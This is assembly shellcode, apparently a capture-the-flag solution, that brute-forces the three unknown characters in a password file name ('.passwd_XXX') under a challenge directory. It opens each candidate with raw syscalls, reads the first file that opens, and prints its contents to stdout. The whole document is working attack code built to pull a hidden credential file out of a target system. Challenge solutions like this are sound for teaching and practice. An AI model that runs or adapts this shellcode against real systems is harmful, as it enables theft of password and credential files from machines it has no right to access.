/*
 * We try to bruteforce the name of a file with a template like "passwd/.passwd_XXX".
 *
 * For each of the X chars exists a loop, the most inner call the open() for that filename
 * and if it's successfull then read the content and write it to the stdout.
 */
.set X_offset, 45
.set lower_limit, 0x01

    jmp template
start:
    pop r11  /* this contains the address of the template string */
    mov r8,  0x80
    mov r9,  0x80
    mov r10, 0x80

loop:
/*
    we start from 0xff and decrement until the last ASCII  
    character is reached (0x30), in that case decrement the
    more inner counter and reset this
*/

inner_loop:
    call write_to_template
    dec r10
    cmp r10, lower_limit

    jl  middle_loop

    jmp loop

middle_loop:
    mov r10, 0x80
    dec r9
    cmp r9, lower_limit
    jl external_loop

    jmp inner_loop

external_loop:  
    mov r9, 0x80
    dec r8
    cmp r8, lower_limit

    jl exit

    jmp middle_loop

exit:
    pop rax /* remove extra entry into stack so to let ret use the real return address */
    ret

template:
    call start
.ascii "/challenge/programmation/ch10/passwd/.passwd_XXX\0"

write_to_template:
    movb [r11 + X_offset], r8b       /* more significative chars */
    movb [r11 + X_offset + 1], r9b 
    movb [r11 + X_offset + 2], r10b

    call open

    ret

printf:/* we are going to save r11 since syscall trash it */
    push r11
    mov rsi, r11
    push (SYS_write) /* 1 */
    pop rax
    push 1
    pop rdi
    push 49
    pop rdx
    syscall

    pop r11

    ret

open:
    push r11

    push (SYS_open)
    pop rax
    push r11
    pop rdi
    xor esi, esi
    syscall

    cmp rax, 0
    jl open_exit /* if fd < 0 then we can came back to the looping */

    /* Save file descriptor for later */
    mov rbx, rax

    /* read the file contents*/
    mov rax, (SYS_read)
    mov rdi, rbx
    mov rdx, 30
    pop rsi

    push rsi /* resave the template address */ 
    syscall

    pop r11
    call printf

    pop rax /* clean the stack from the caller rip */
    jmp exit /* exit from the shellcode, all is done here */

open_exit:
    pop r11
    ret
